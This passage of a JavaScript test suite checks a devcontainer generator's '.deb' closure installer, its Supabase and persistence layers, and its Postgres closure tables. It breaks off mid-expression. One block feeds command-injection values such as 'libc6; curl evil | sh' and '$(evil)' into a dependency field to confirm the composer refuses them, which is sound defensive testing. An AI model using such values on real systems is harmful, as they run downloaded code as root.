// A `.deb` CLOSURE (a fragment's `archives`, format `deb`): the same one installer, run against a re-rooted filesystem with
// curl, uname, apt-get and sudo stubbed — but REAL `.deb` files through the real dpkg-deb. Download-and-check before anything
// changes, what Debian must supply, unpack, prune, wrappers (a `.deb`'s binaries have no RUNPATH), a moved pin, and every way
// it must fail loudly. tools/postgres-debs/run-closure.mjs is the same run on the real closures, by hand.
checkAsync('image: a .deb closure unpacks at its pin behind wrappers, satisfies Debian without Recommends, and a moved pin switches cleanly', async (ok) => {
  const { createHash } = await import('node:crypto');
  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const dir = mkdtempSync(join(tmpdir(), 'deb-closure-'));
  const [stubs, root, served] = [join(dir, 'stubs'), join(dir, 'root'), join(dir, 'served')];
  for (const path of [stubs, served, join(root, 'etc'), join(root, 'usr/local/bin')]) mkdirSync(path, { recursive: true });
  /** A real `.deb` with a `bin/<tool>` per name (each prints its name, version and LD_LIBRARY_PATH), a library dir and docs. */
  const deb = (name, version, tools) => {
    const src = join(dir, `src-${name}-${version}`);
    for (const path of ['DEBIAN', 'usr/lib/x86_64-linux-gnu', 'usr/share/doc/x', 'tree/bin']) mkdirSync(join(src, path), { recursive: true });
    writeFileSync(join(src, 'DEBIAN/control'), `Package: ${name}\nVersion: ${version}\nArchitecture: amd64\nMaintainer: t <t@t.test>\nDescription: t\n`);
    writeFileSync(join(src, `usr/lib/x86_64-linux-gnu/lib${name}.so`), '');
    writeFileSync(join(src, 'usr/share/doc/x/README'), 'docs\n');
    for (const tool of tools) writeFileSync(join(src, 'tree/bin', tool), `#!/bin/sh\necho "${tool} ${version} [$LD_LIBRARY_PATH] $*"\n`, { mode: 0o755 });
    writeFileSync(join(src, 'tree/bin/not-executable'), 'data\n', { mode: 0o644 });
    const file = join(served, `${name}_${version}_amd64.deb`);
    execFileSync('dpkg-deb', ['-b', '--root-owner-group', src, file], { stdio: 'ignore' });
    return { url: `https://archives.test/${name}_${version}_amd64.deb`, sha256: createHash('sha256').update(readFileSync(file)).digest('hex') };
  };
  const log = join(dir, 'calls.log');
  writeFileSync(join(stubs, 'curl'), `#!/bin/sh\nfor a; do case "$a" in https://*) url="$a" ;; esac; done\nwhile [ $# -gt 0 ]; do [ "$1" = -o ] && out="$2"; shift; done\necho "curl $url" >> '${log}'\ncp '${served}'/"\${url##*/}" "$out"\n`, { mode: 0o755 });
  writeFileSync(join(stubs, 'apt-get'), `#!/bin/sh\necho "apt-get $*" >> '${log}'\n[ ! -e '${dir}/apt-fails' ] || [ "$1" != satisfy ]\n`, { mode: 0o755 });
  writeFileSync(join(stubs, 'uname'), '#!/bin/sh\necho x86_64\n', { mode: 0o755 });
  writeFileSync(join(stubs, 'dpkg-query'), "#!/bin/sh\nprintf 'install ok installed'\n", { mode: 0o755 });
  writeFileSync(join(stubs, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
  writeFileSync(join(stubs, 'sleep'), '#!/bin/sh\n', { mode: 0o755 });
  const DEPENDS = 'libc6 (>= 2.38), libicu76 (>= 76.1-1~), libz (>= 1:1.1.4) | libz-ng, tzdata';
  const tool = (version, debs, extra = {}) => ({
    format: 'deb',
    id: 'tool',
    bin: 'tree/bin',
    libraryPaths: ['usr/lib/*-linux-gnu'],
    prune: ['usr/share/doc', 'tree/bin/pruned'],
    closures: { trixie: { version, systemDepends: DEPENDS, packages: { amd64: debs } } },
    ...extra,
  });
  const render = (...archives) => renderOsPackagesScript(compose([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, archives } }], { nodeMajor: '22' }));
  const runIt = (text, ...lists) => {
    writeFileSync(join(dir, 'house.packages.sh'), text);
    rmSync(log, { force: true });
    let result;
    try {
      result = { status: 0, output: execFileSync('sh', ['-c', 'sh "$@" 2>&1', 'sh', join(dir, 'house.packages.sh'), ...lists], { env: { PATH: `${stubs}:${process.env.PATH}`, HOUSE_PACKAGES_ROOT: root }, encoding: 'utf8', cwd: dir, stdio: ['ignore', 'pipe', 'pipe'] }) };
    } catch (error) {
      result = { status: error.status, output: `${error.stdout}${error.stderr}` };
    }
    return { ...result, calls: existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n') : [] };
  };
  const home = join(root, 'opt/bespunky/tool');
  const links = join(root, 'usr/local/bin');
  const wrapped = (name, env = {}, ...args) => execFileSync(join(links, name), args, { encoding: 'utf8', env: { PATH: process.env.PATH, ...env } }).trim();
  writeFileSync(join(root, 'etc/os-release'), 'ID=debian\nVERSION_CODENAME="trixie"\n');
  try {
    const a1 = deb('a', '1.0', ['hello', 'only-v1', 'pruned']);
    const b1 = deb('b', '1.0', ['other']);
    const v1 = render(tool('1.0-aaaa', [a1, b1]));

    // The rendered script's shape.
    ok(shParses(v1) && !v1.includes('{{'), 'the closure script does not parse under sh, or kept a placeholder');
    ok(v1.includes(`tool tool tree/bin usr/lib/*-linux-gnu usr/share/doc,tree/bin/pruned\n`) && v1.includes(`closure tool trixie 1.0-aaaa ${DEPENDS}\n`) && v1.includes(`deb tool trixie amd64 ${a1.sha256} ${a1.url}\n`), 'the closure lines are not in the script');
    ok(v1.includes('curl ca-certificates') && v1.includes('(HOUSE_DEB_ARCHIVES, below)'), 'a closure did not bring its fetch tools');
    ok(!/install_archive|HOUSE_ARCHIVES=/.test(v1) && /install_deb_archive "\$\{id#deb:\}"/.test(v1), 'a closure-only script carries the tarball machinery, or lacks its own');
    // The apt rules hold: Debian by NAME and without Recommends, the closure through dpkg-deb. Nothing registers with dpkg.
    ok(/apt-get satisfy -y --no-install-recommends "\$1"/.test(v1) && /dpkg-deb -x /.test(v1), 'the closure is not satisfied and unpacked as designed');
    ok(!/apt-key|signed-by|dpkg -i|apt-get install [^\n]*\.deb|sources\.list/.test(v1), 'a third-party apt mechanism crept into the closure installer');

    const first = runIt(v1);
    ok(first.status === 0, `fresh install: ${JSON.stringify(first)}`);
    ok(readlinkSafe(join(home, 'current')) === '1.0-aaaa' && existsSync(join(home, '1.0-aaaa/tree/bin/hello')) && !existsSync(join(home, '.partial')), 'the pinned release is not current, or a partial was left');
    // Everything downloaded and checked BEFORE apt is asked, and apt asked for exactly the string, without Recommends.
    ok(first.calls.join('|') === `curl ${a1.url}|curl ${b1.url}|apt-get update|apt-get satisfy -y --no-install-recommends ${DEPENDS}`, `the install order: ${first.calls.join(' | ')}`);
    const libs = join(home, 'current/usr/lib/x86_64-linux-gnu');
    ok(wrapped('hello', {}, 'x', 'y z') === `hello 1.0 [${libs}] x y z`, `the wrapper's environment or arguments: ${wrapped('hello', {}, 'x', 'y z')}`);
    ok(wrapped('hello', { LD_LIBRARY_PATH: '/theirs' }) === `hello 1.0 [${libs}:/theirs]`, 'the wrapper replaced LD_LIBRARY_PATH instead of adding to it');
    ok(wrapped('other') === `other 1.0 [${libs}]`, 'every package in the closure is one tree');
    ok(!lstatSync(join(links, 'hello')).isSymbolicLink(), 'a plain link is not enough: there would be no LD_LIBRARY_PATH');
    ok(!lexists(join(links, 'not-executable')), 'a non-executable got a wrapper');
    ok(!existsSync(join(home, 'current/usr/share/doc')) && !lexists(join(links, 'pruned')) && existsSync(join(home, 'current/usr/lib')), 'prune did not remove its paths (or the wrapper of a pruned executable), or removed more');

    const again = runIt(v1);
    ok(again.status === 0 && again.calls.length === 0 && /all present/.test(again.output), `at the pin, the installer still acted: ${JSON.stringify(again)}`);

    // A version names the whole closure: it moves, it reinstalls, the old release and its gone wrapper leave.
    const a2 = deb('a', '2.0', ['hello']);
    const moved = runIt(render(tool('2.0-bbbb', [a2])));
    ok(moved.status === 0 && readlinkSafe(join(home, 'current')) === '2.0-bbbb' && wrapped('hello') === `hello 2.0 [${libs}]`, `a moved pin did not switch: ${JSON.stringify(moved)}`);
    ok(!existsSync(join(home, '1.0-aaaa')) && !lexists(join(links, 'only-v1')) && !lexists(join(links, 'other')), 'a moved pin left the old release or a wrapper it no longer has');
    const back = runIt(v1);
    ok(back.status === 0 && readlinkSafe(join(home, 'current')) === '1.0-aaaa' && wrapped('hello') === `hello 1.0 [${libs}]`, 'moving the pin BACK did not switch');

    // Refusals. Each leaves the installed release exactly as it was.
    const tampered = runIt(render(tool('3.0-cccc', [a2, { ...b1, sha256: 'f'.repeat(64) }])));
    ok(tampered.status !== 0 && /does not match its pinned sha256/.test(tampered.output) && readlinkSafe(join(home, 'current')) === '1.0-aaaa', `a checksum mismatch was installed: ${JSON.stringify(tampered)}`);
    ok(!tampered.calls.some((call) => call.startsWith('apt-get')), 'a bad file still reached apt: it must change nothing on this machine');
    writeFileSync(join(dir, 'apt-fails'), '');
    const noDebian = runIt(render(tool('3.0-cccc', [a2])));
    rmSync(join(dir, 'apt-fails'));
    ok(noDebian.status !== 0 && noDebian.calls.filter((call) => call.startsWith('apt-get satisfy')).length === 3 && /Debian could not supply what tool needs/.test(noDebian.output) && readlinkSafe(join(home, 'current')) === '1.0-aaaa', `a failing satisfy must retry 3x, fail, and leave current: ${JSON.stringify(noDebian)}`);
    const noLibs = runIt(render(tool('3.0-cccc', [a2], { libraryPaths: ['nowhere/*'] })));
    ok(noLibs.status !== 0 && /could not run/.test(noLibs.output) && readlinkSafe(join(home, 'current')) === '1.0-aaaa', `a closure with no library dir went live: ${JSON.stringify(noLibs)}`);

    // Never over somebody else's file (a plain file, or a link), whichever the wrapper's name.
    rmSync(join(links, 'hello'));
    writeFileSync(join(links, 'hello'), 'theirs\n');
    const foreign = runIt(render(tool('2.0-bbbb', [a2])));
    ok(foreign.status === 0 && readFileSync(join(links, 'hello'), 'utf8') === 'theirs\n' && /not tool's — left alone/.test(foreign.output), `a file the installer did not make was clobbered: ${JSON.stringify(foreign)}`);
    rmSync(join(links, 'hello'));

    // Another Debian release, none at all, another architecture: loud, naming what it has. The exit is what post-create reports.
    writeFileSync(join(root, 'etc/os-release'), 'ID=debian\nVERSION_CODENAME=forky\n');
    const forky = runIt(render(tool('4.0-dddd', [a2])));
    ok(forky.status !== 0 && /no closure for this Debian release \('forky'; it has: trixie \)/.test(forky.output) && forky.calls.length === 0, `an unknown codename did not fail loudly: ${JSON.stringify(forky)}`);
    ok(/upgrade it/.test(forky.output) && /use a tag on one of those releases/.test(forky.output), `the refusal did not give the way out: ${forky.output}`);
    rmSync(join(root, 'etc/os-release'));
    const unreadable = runIt(render(tool('4.0-dddd', [a2])));
    ok(unreadable.status !== 0 && /'unknown'/.test(unreadable.output), `an image with no os-release did not fail loudly: ${JSON.stringify(unreadable)}`);
    writeFileSync(join(root, 'etc/os-release'), 'VERSION_CODENAME=trixie\n');
    const armOnly = runIt(render({ ...tool('4.0-dddd', []), closures: { trixie: { version: '4.0-dddd', systemDepends: DEPENDS, packages: { arm64: [a2] } } } }));
    ok(armOnly.status !== 0 && /no closure for this architecture \(amd64\) on trixie/.test(armOnly.output) && armOnly.calls.length === 0, `an architecture with no closure did not fail loudly: ${JSON.stringify(armOnly)}`);

    // The refusal of `name=version` holds in a script that also carries closures: that road stays closed.
    const list = join(dir, 'os-packages.txt');
    writeFileSync(list, 'libfoo=1.2\n');
    writeFileSync(join(stubs, 'dpkg-query'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
    const pinnedName = runIt(render(tool('2.0-bbbb', [a2])), list);
    ok(/ignoring 'libfoo=1.2' — not a Debian package name/.test(pinnedName.output) && !pinnedName.calls.some((call) => /install .*libfoo/.test(call)), `name=version reached apt: ${JSON.stringify(pinnedName)}`);
    writeFileSync(join(stubs, 'dpkg-query'), "#!/bin/sh\nprintf 'install ok installed'\n", { mode: 0o755 });

    // Both formats in one script, each by its own path.
    const src = join(dir, 'tarball/tar/bin');
    mkdirSync(src, { recursive: true });
    writeFileSync(join(src, 'tarred'), '#!/bin/sh\necho tarred\n', { mode: 0o755 });
    execFileSync('tar', ['-czf', join(served, 'tar-1.tar.gz'), '-C', join(dir, 'tarball'), 'tar']);
    const tarball = { id: 'tar', version: '1', bin: 'tar/bin', downloads: { amd64: { url: 'https://archives.test/tar-1.tar.gz', sha256: createHash('sha256').update(readFileSync(join(served, 'tar-1.tar.gz'))).digest('hex') } } };
    const both = runIt(render(tarball, tool('5.0-eeee', [a2])));
    ok(both.status === 0 && wrapped('tarred') === 'tarred' && lstatSync(join(links, 'tarred')).isSymbolicLink() && wrapped('hello') === `hello 2.0 [${libs}]`, `tarball and closure in one script: ${JSON.stringify(both)}`);
    ok(both.status === 0 && /\(HOUSE_ARCHIVES, HOUSE_DEB_ARCHIVES, below\)/.test(render(tarball, tool('5.0-eeee', [a2]))), 'both lists are not named as fetched');
    const tarOnly = render(tarball);
    ok(!/HOUSE_DEB_ARCHIVES|install_deb_archive|VERSION_CODENAME|satisfy|dpkg-deb/.test(tarOnly) && shParses(tarOnly), 'a tarball-only script carries the closure machinery: every project with one would rebuild its image for nothing');

    // The composer refuses what the installer would run as root.
    const refuses = (archive, what) => {
      try {
        render(archive);
        ok(false, `the composer accepted ${what}`);
      } catch (error) {
        ok(/is malformed/.test(error.message), `${what}: ${error.message}`);
      }
    };
    const closure = (patch) => ({ ...tool('1', [a1]), closures: { trixie: { version: '1', systemDepends: DEPENDS, packages: { amd64: [a1] }, ...patch } } });
    refuses(closure({ systemDepends: 'libc6; curl evil | sh' }), 'shell in systemDepends');
    refuses(closure({ systemDepends: '$(evil)' }), 'a substitution in systemDepends');
    refuses(closure({ version: '../up' }), 'a version that leaves its directory');
    refuses(closure({ packages: {} }), 'a codename with no packages');
    refuses(closure({ packages: { amd64: [] } }), 'an architecture with no packages');
    refuses(closure({ packages: { amd64: [{ url: 'http://x.test/a.deb', sha256: a1.sha256 }] } }), 'a plain-http url');
    refuses(closure({ packages: { amd64: [{ url: 'https://x.test/a.tar.gz', sha256: a1.sha256 }] } }), 'a url that is not a .deb');
    refuses(closure({ packages: { amd64: [{ url: a1.url, sha256: 'abc' }] } }), 'a malformed sha256');
    refuses(closure({ packages: { riscv64: [a1] } }), 'an unknown architecture');
    refuses({ ...tool('1', [a1]), closures: {} }, 'no closures at all');
    refuses({ ...tool('1', [a1]), closures: { 'Tri xie': tool('1', [a1]).closures.trixie } }, 'a malformed codename');
    refuses(tool('1', [a1], { bin: '../bin' }), 'a bin that leaves the tree');
    refuses(tool('1', [a1], { libraryPaths: [] }), 'no library paths');
    refuses(tool('1', [a1], { libraryPaths: ['../*'] }), 'a library path that leaves the tree');
    refuses(tool('1', [a1], { prune: ['tree/*'] }), 'a prune pattern');
    refuses(tool('1', [a1], { prune: ['tree'] }), 'a prune path that holds bin');
    refuses(tool('1', [a1], { id: 'No Good' }), 'a malformed id');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// Persistence: a closure lives in the IMAGE, in a cached layer, outside every persisted directory. Nothing of its own needs a
// mount, and a mount over either of its two homes would hide what the image built.
check('no layer declares a floating devcontainer feature: a bare id is `latest` and a major tag moves within its major, with no commit behind either', (ok) => {
  const found = [];
  const tree = createTreeWithEmptyWorkspace();
  const walk = (node, where) => {
    if (!node || typeof node !== 'object') return;
    for (const [key, value] of Object.entries(node)) {
      if (key === 'features' && Array.isArray(value)) found.push(...value.map((feature) => ({ where, id: feature.id })));
      else walk(value, where);
    }
  };
  for (const layer of registry.LAYERS) walk(typeof layer.devcontainer === 'function' ? layer.devcontainer(tree) : layer.devcontainer, layer.id);
  ok(found.length >= 2, `the walk sees the layers' features: ${JSON.stringify(found)}`);
  for (const { where, id } of found) {
    ok(/:\d+\.\d+\.\d+$/.test(id) || /@sha256:[0-9a-f]{64}$/.test(id), `${where}: ${id} names no exact version. Pin it in _utils/versions.ts.`);
  }
});

checkAsync('supabase: the CLI in the image by exact pin; its state in the persisted ~/.local by a literal path; no server of Debian\'s; docs honest', async (ok) => {
  const { SUPABASE_CLI_DOWNLOADS, SUPABASE_CLI_VERSION } = require_(join(BUILD, 'src/generators/_utils/versions'));
  const tree = wrapperRepo();
  const a = await artifacts(tree, ['nx', 'agent', 'postgres', 'supabase']);
  const home = `/home/${a.dc.remoteUser ?? 'vscode'}`;
  for (const [arch, { url, sha256 }] of Object.entries(SUPABASE_CLI_DOWNLOADS)) ok(a.osScript.includes(`supabase ${SUPABASE_CLI_VERSION} ${arch} ${sha256} ${url} .`), `the installer lacks the CLI's ${arch} line`);
  ok(!a.osScript.includes('dbmate') && !a.osScript.includes('postgresql-18'), 'the Debian server or dbmate is still installed: with this layer they serve nothing');
  ok(/postgresql-client/.test(a.osScript) && /\bprocps\b/.test(a.osScript), 'psql or /bin/ps is missing');
  // Where the state is, found by running the CLI (layers/supabase.ts): SUPABASE_HOME holds the login, the cache and the stacks.
  ok(a.dc.containerEnv?.SUPABASE_HOME === `${home}/.local/share/supabase`, `the login and the stacks would not survive a rebuild: ${a.dc.containerEnv?.SUPABASE_HOME}`);
  ok(a.dc.containerEnv?.SUPABASE_NO_KEYRING === '1', 'without it, `logout` fails on a container with no keyring');
  ok(a.dc.containerEnv?.DO_NOT_TRACK === '1', 'the CLI sends telemetry by default');
  ok(a.dc.mounts.some((m) => m.includes(`target=${home}/.local,type=volume`)), '~/.local is not a persisted volume');
  const without = await artifacts(wrapperRepo(), ['nx', 'agent', 'postgres']);
  ok(a.dc.mounts.length === without.dc.mounts.length, 'the layer added a mount: its state belongs in a persisted XDG home');
  ok(a.dc.portsAttributes?.['__supabase_stack_host__']?.onAutoForward === 'ignore', 'a stack\'s ports are left to auto-forward: its superuser password is well known');
  ok(!/postgres(ql)?:\/\//.test(a.dcText), 'a database URL in devcontainer.json is inherited by every process, and committed');
  ok(a.house.includes('## Supabase') && a.house.includes('ALPHA') && a.house.includes('accepted gap') && a.house.includes('local only'), 'the house docs do not say what the layer is');
  ok(!a.house.includes('postgres/migrations/<14 digits>') && a.house.includes('supabase/migrations/<digits>') && !a.house.includes('.bespunky/postgres.json`** ('), 'the docs still describe the native provider');
  ok(a.rules.includes('only the launcher starts and stops the stack'), 'the rules do not say who starts the stack');
  ok(a.house.includes('postgres:gen-types') && a.house.includes('postgres:new-function') && a.house.includes('postgres:secrets-set') && a.house.includes('Function not found'), 'the docs do not name the verbs, or the /tmp limit');
  ok(!without.house.includes('postgres:gen-types'), 'a native project reads about verbs it has not got');
  ok(!without.house.includes('## Supabase') && !without.rules.includes('only the launcher starts') && without.house.includes('postgres/migrations/<14 digits>'), 'a project on the native provider reads about Supabase');
  ok(!JSON.stringify(a.settings).includes('supabase@'), 'the official plugin connects to the hosted MCP with write access: not enabled by this layer');
});
checkAsync('persistence: an archive tool needs no mount, and no layer mounts over where it is installed', async (ok) => {
  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const fragmentOf = (entry, tree) => (typeof entry.devcontainer === 'function' ? entry.devcontainer(tree) : entry.devcontainer);
  const tree = createTreeWithEmptyWorkspace();
  writeJson(tree, 'firebase.json', {});
  tree.write('.nvmrc', '22\n');
  const contributors = registry.LAYERS.filter((entry) => entry.devcontainer).map((entry) => ({ id: entry.id, fragment: fragmentOf(entry, tree) }));
  const closure = { format: 'deb', id: 'tool', bin: 'bin', libraryPaths: ['lib'], closures: { trixie: { version: '1', systemDepends: 'tzdata', packages: { amd64: [{ url: 'https://x.test/a.deb', sha256: 'a'.repeat(64) }] } } } };
  const without = compose(contributors, { nodeMajor: '22' });
  const composed = compose([...contributors, { id: 'test', fragment: { archives: [closure] } }], { nodeMajor: '22' });
  ok(composed.mounts.length === without.mounts.length, 'an archive tool added a mount');
  const covers = (target, path) => path === target || path.startsWith(`${target.replace(/\/$/, '')}/`) || target.startsWith(`${path}/`);
  for (const { mount } of composed.mounts) {
    const target = /target=([^,]+)/.exec(mount)?.[1] ?? '';
    ok(!covers(target, '/opt/bespunky') && !covers(target, '/usr/local/bin'), `the mount ${target} would hide what the image's archive layer built`);
  }
  ok(shParses(renderOsPackagesScript(composed)), 'every layer plus a closure does not parse');
  // The image build and post-create (an adopted image) run this one installer: closures come with no path of their own.
  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
  ok(/RUN sh \/tmp\/bespunky-os-packages\/house\.packages\.sh/.test(a.dockerfile) && /if sh \.devcontainer\/house\.packages\.sh \.devcontainer\/os-packages\.txt; then/.test(a.post), 'the image build and post-create no longer share the one installer');
});

// The Postgres closures table, OFFLINE (tools/postgres-debs/project.mjs re-asks the archive on a schedule and before a
// publish): it covers the pins, it is exactly what the tool writes (so a hand-edit shows), and the selection rules hold
// against indexes with the futures that would break them.
checkAsync('postgres closures: the table covers the pins, is exactly what its tool renders, and libpq5 is selected by major', async (ok) => {
  const { buildClosure, parsePackages, pinnedDownloads, render, selectPackages, signedBy } = await import('../postgres-debs/closure.mjs');
  {
    // The floating-image tripwire's reading, OFFLINE: the network half is tools/postgres-debs/image-codenames.mjs, weekly.
    const { KNOWN_OUTSIDE, codenameByDigest, composedImages, judge, releaseTags } = await import('../postgres-debs/image-codenames.mjs');
    const layersDir = join(PAYLOAD, 'src/layers');
    const images = composedImages(readdirSync(layersDir).filter((f) => f.endsWith('.ts')).map((f) => readFileSync(join(layersDir, f), 'utf8')), [22, 24]);
    ok(['mcr.microsoft.com/devcontainers/base:debian', 'mcr.microsoft.com/devcontainers/typescript-node:22', 'mcr.microsoft.com/devcontainers/typescript-node:24'].every((image) => images.includes(image)), `the tripwire lost a composed image: ${images}`);
    ok(images.every((image) => !image.includes('{{')), `a ref left a token unexpanded: ${images}`);
    const baseTags = releaseTags('debian', ['debian', 'trixie', 'latest', 'debian-13', 'bookworm', 'dev']);
    ok(baseTags.map((c) => c.codename).join() === 'trixie,bookworm', `base's release tags: ${JSON.stringify(baseTags)}`);
    const nodeTags = releaseTags('22', ['22', '22-trixie', '22-bookworm', '2-bookworm', '220-trixie', '22-trixie-amd64']);
    ok(nodeTags.map((c) => c.codename).join() === 'trixie,bookworm', `a node major's release tags: ${JSON.stringify(nodeTags)}`);
    const candidates = [{ codename: 'trixie', digest: 'a' }, { codename: 'bookworm', digest: 'b' }];
    ok(codenameByDigest('a', candidates) === 'trixie' && codenameByDigest('z', candidates) === undefined && codenameByDigest('a', [...candidates, { codename: 'forky', digest: 'a' }]) === undefined, 'a digest must name exactly one release');
    const verdicts = Object.fromEntries(judge({ on: 'trixie', moved: 'forky', blind: undefined, kept: 'bullseye', keptMoved: 'buster' }, ['trixie', 'bookworm'], { kept: { codename: 'bullseye' }, keptMoved: { codename: 'bullseye' } }).map((r) => [r.image, r.verdict]));
    ok(verdicts.on === 'ok' && verdicts.moved === 'missing' && verdicts.blind === 'unknown' && verdicts.kept === 'known' && verdicts.keptMoved === 'missing', `the tripwire's verdicts: ${JSON.stringify(verdicts)}`);
    ok(Object.values(KNOWN_OUTSIDE).every((entry) => entry.codename && entry.why), 'an exemption states its codename and its reason');
  }
  // A status of a good signature by another key in the keyring: the key file served may hold more than PGDG's.
  const statusBy = (primary) => `[GNUPG:] GOODSIG ABCD someone\n[GNUPG:] VALIDSIG SUBKEY 2026-11-04 1 0 4 0 1 10 01 ${primary}\n`;
  ok(signedBy(statusBy('AAAA'), 'AAAA') && !signedBy(statusBy('BBBB'), 'AAAA') && !signedBy('[GNUPG:] GOODSIG ABCD someone\n', 'AAAA'), 'a signature is not held to the fingerprint');
  const versions = require_(join(BUILD, 'src/generators/_utils/versions'));
  const { POSTGRES_CLOSURES, POSTGRES_CLOSURES_AS_OF } = require_(join(BUILD, 'src/generators/_utils/postgres-closures'));
  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const source = readFileSync(join(PAYLOAD, 'src/generators/_utils/postgres-closures.ts'), 'utf8');
  ok(render(POSTGRES_CLOSURES, POSTGRES_CLOSURES_AS_OF) === source, 'postgres-closures.ts is not what its tool renders (hand-edited?): node tools/postgres-debs/project.mjs --write');
  ok(/^\d{4}-\d{2}-\d{2}$/.test(POSTGRES_CLOSURES_AS_OF), 'the table has no as-of date');
  // What the weekly check reads the dbmate pins with: a pin it cannot read must not read as a pin that is fine.
  const dbmatePins = pinnedDownloads(readFileSync(join(PAYLOAD, 'src/generators/_utils/versions.ts'), 'utf8'), 'DBMATE');
  ok(dbmatePins.version === versions.DBMATE_VERSION, 'the check reads the dbmate version the payload pins');
  ok(JSON.stringify(Object.fromEntries(dbmatePins.pins.map(({ arch, url, sha256 }) => [arch, { url, sha256 }]))) === JSON.stringify(versions.DBMATE_DOWNLOADS), 'the check reads every dbmate download the payload pins, as the payload computes it');
  let unreadable = false;
  try {
    pinnedDownloads("export const NOPE_VERSION = '1';", 'NOPE');
  } catch {
    unreadable = true;
  }
  ok(unreadable, 'a pin the check cannot read is an error, never an empty list');
  // The Supabase CLI's upstream check, offline: only a broken pin can fail it, and what it reads must not read as fine when it is not there.
  const supabaseCheck = await import('../supabase-cli/check.mjs');
  const cliPins = pinnedDownloads(readFileSync(join(PAYLOAD, 'src/generators/_utils/versions.ts'), 'utf8'), 'SUPABASE_CLI');
  ok(cliPins.version === versions.SUPABASE_CLI_VERSION, 'the check reads the CLI version the payload pins');
  ok(JSON.stringify(Object.fromEntries(cliPins.pins.map(({ arch, url, sha256 }) => [arch, { url, sha256 }]))) === JSON.stringify(versions.SUPABASE_CLI_DOWNLOADS), 'the check reads every CLI download the payload pins, as the payload computes it');
  ok(supabaseCheck.nativeStage('x,"slug":"native-local-runtime","status":{"stage":"Public Alpha","availableOnSelfHosted":true}') === 'Public Alpha', 'the stage, from the page\'s data');
  ok(supabaseCheck.nativeStage('<div>Stage:</div>  <b>Public Alpha</b>  <div>Available</div>') === 'Public Alpha', 'the stage, from the page\'s words');
  ok(supabaseCheck.nativeStage('<html>nothing about it</html>') === undefined, 'a page that no longer says is unread, never a stage');
  ok(supabaseCheck.notices({ pin: '3.0.0', latest: '3.0.0', stage: 'Public Alpha' }).length === 0, 'nothing new: nothing said');
  ok(/3\.1\.0 is out/.test(supabaseCheck.notices({ pin: '3.0.0', latest: '3.1.0', stage: 'Public Alpha' }).join()), 'a newer release is said');
  ok(supabaseCheck.notices({ pin: '3.1.0', latest: '3.0.0', stage: 'Public Alpha' }).length === 0, 'an older `latest` is no news');
  ok(/now "General Availability"/.test(supabaseCheck.notices({ pin: '3.0.0', latest: '3.0.0', stage: 'General Availability' }).join()), 'leaving alpha is said');
  ok(supabaseCheck.notices({ pin: '3.0.0' }).length === 2, 'what could not be read is said, each');
  ok(Object.keys(POSTGRES_CLOSURES).sort().join() === [...versions.POSTGRES_MAJORS].sort().join(), `the table's majors are not the pins: ${Object.keys(POSTGRES_CLOSURES)} (node tools/postgres-debs/project.mjs --write)`);
  // The image job's table is hand-written, and its header says it covers every major on every release.
  const imageCases = readFileSync(new URL('../check-runner-image/postgres-image.sh', import.meta.url), 'utf8').match(/^pg\d+-[^|]*\|[^|]*\|[^|]*\|\d+\|[^|]*\|\w+$/gm) ?? [];
  const imageCovers = new Set(imageCases.map((line) => { const fields = line.split('|'); return `${fields[3]}/${fields[5]}`; }));
  for (const major of versions.POSTGRES_MAJORS) {
    for (const codename of versions.POSTGRES_DEB_CODENAMES) ok(imageCovers.has(`${major}/${codename}`), `tools/check-runner-image/postgres-image.sh has no case for Postgres ${major} on ${codename}`);
  }
  // Likewise the Supabase job's: every release the house composes, and a launcher boot on each that has a Node of its own.
  const supabaseCases = readFileSync(new URL('../check-runner-image/supabase-image.sh', import.meta.url), 'utf8').match(/^sb-[^|]*\|[^|]*\|[^|]*\|[^|]*\|\w+$/gm) ?? [];
  for (const codename of versions.POSTGRES_DEB_CODENAMES) ok(supabaseCases.some((line) => { const fields = line.split('|'); return fields[4] === codename && fields[1] === 'node'; }), `tools/check-runner-image/supabase-image.sh has no case booting on ${codename}`);
  for (const major of versions.POSTGRES_MAJORS) {
    const closures = POSTGRES_CLOSURES[major] ?? {};
    ok(Object.keys(closures).join() === versions.POSTGRES_DEB_CODENAMES.join(), `Postgres ${major}'s codenames are not the pins: ${Object.keys(closures)}`);
    for (const [codename, closure] of Object.entries(closures)) {
      ok(closure.version.startsWith(`${major}.`), `${major}/${codename} is named ${closure.version}`);
      ok(Object.keys(closure.packages).join() === versions.POSTGRES_DEB_ARCHITECTURES.join(), `${major}/${codename}'s architectures are not the pins`);
      ok(!/postgresql-common|ssl-cert|debconf|locales|\blibpq5\b/.test(closure.systemDepends) && /\btzdata\b/.test(closure.systemDepends), `${major}/${codename}'s systemDepends has the packaging, the closure's own, or lacks tzdata: ${closure.systemDepends}`);
      for (const [arch, debs] of Object.entries(closure.packages)) {
        const names = debs.map(({ url }) => /\/([^/_]+)_[^/]+\.deb$/.exec(url)[1]);
        ok(names.join() === [`postgresql-${major}`, `postgresql-client-${major}`, 'libpq5', ...versions.POSTGRES_EXTENSIONS.map((extension) => `postgresql-${major}-${extension}`)].join(), `${major}/${codename}/${arch}: ${names}`);
        ok(debs.some(({ url }) => url.includes(`/libpq5_${major}.`)), `${major}/${codename}/${arch} pins another major's libpq5`);
        ok(debs.every(({ url }) => !url.includes('~') && url.startsWith('https://apt-archive.postgresql.org/')), `${major}/${codename}/${arch} pins a prerelease, or leaves the archive`);
      }
    }
    // Real data through the format's own validation.
    const tool = { format: 'deb', id: 'postgres', bin: `usr/lib/postgresql/${major}/bin`, libraryPaths: ['usr/lib/*-linux-gnu'], closures };
    ok(shParses(renderOsPackagesScript(compose([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, archives: [tool] } }], { nodeMajor: '22' }))), `the real Postgres ${major} table does not render`);
  }

  // The rules, against an index shaped like the day 19 is GA: a stable libpq5 19.0, with no tilde.
  const stanza = (name, version, depends = '') => `Package: ${name}\nVersion: ${version}\nDepends: ${depends}\nFilename: pool/${name}_${version}.deb\nSHA256: ${'a'.repeat(64)}\n`;
  const index = (extra = []) =>
    parsePackages(
      [
